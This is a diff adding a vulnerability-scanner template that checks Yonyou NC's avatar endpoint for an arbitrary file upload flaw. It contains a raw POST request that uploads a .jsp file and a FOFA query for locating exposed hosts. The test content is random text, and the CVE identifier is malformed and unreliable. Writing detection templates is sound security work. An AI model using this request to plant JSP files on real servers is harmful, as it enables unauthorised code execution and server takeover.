@@ -1,0 +1,54 @@
+id: yonyou-nc-avatar-upload
+
+info:
+  name: Yonyou NC avatar - File Upload
+  author: k3ppf0r
+  severity: critical
+  description: |  
+    用友 NC avatar接口处存在任意文件上传漏洞，攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。
+  reference:
+    - https://blog.csdn.net/qq_36618918/article/details/137913219
+    - https://github.com/wy876/POC/blob/main/%E7%94%A8%E5%8F%8BOA/%E7%94%A8%E5%8F%8BNC-avatar%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
+  classification:
+    cve-id: 2024-05092222
+    cvss-score: 9.0
+    cwe-id: CWE-434
+  metadata:
+    date: 2024-01-06
+    version: 用友NC
+    fofa-query: body="UClient.dmg"
+  tags: 用友-U8,用友-NC-Cloud,Yonyou-UFIDA-NC,Yonyou-U8-Cloud
+
+variables:
+  file_name: "{{to_lower(rand_text_alpha(8))}}.jsp"
+  file_content: "{{to_lower(rand_text_alpha(10))}}"
+
+http:
+  - raw:
+      - |
+        POST /uapim/upload/avatar?usercode=1&fileType=jsp HTTP/1.1
+        Host: {{Hostname}} 
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryEXmnamw5gVZG9KAQ
+        User-Agent: Mozilla/5.0 
+
+        ------WebKitFormBoundaryEXmnamw5gVZG9KAQ
+        Content-Disposition: form-data; name="file"; filename="{{file_name}}"
+        Content-Type: application/octet-stream
+
+        {{file_content}}
+        ------WebKitFormBoundaryEXmnamw5gVZG9KAQ--
+
+    
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "true"
+      - type: word
+        part: header
+        words:
+          - "Content-Length: 4"
+      - type: status
+        status:
+          - 200
